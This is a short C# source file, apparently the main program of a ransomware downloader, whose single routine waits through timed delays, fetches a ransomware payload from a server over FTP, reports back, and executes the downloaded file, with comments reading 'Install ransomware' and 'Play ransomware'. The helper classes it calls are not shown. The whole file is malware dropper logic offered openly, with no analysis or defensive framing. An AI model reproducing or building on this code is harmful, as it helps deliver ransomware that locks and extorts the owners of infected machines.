using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RansomwareDownloader
{
    class Program
    {

        static void Main(string[] args)
        {
            ransomwareDownload();
        }

        public static void ransomwareDownload()
        {

            Thread.Sleep(18000);
            serverCommunicator.getQuickRansomware();
            Thread.Sleep(2000);
            //Install ransomware

            Thread.Sleep(5000);

            serverCommunicator.downloadFileFTP();

            Thread.Sleep(15000);

            serverCommunicator.postQuickFetched();

            Thread.Sleep(10000);

            programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());



            //Play ransomware
        }
    }
}
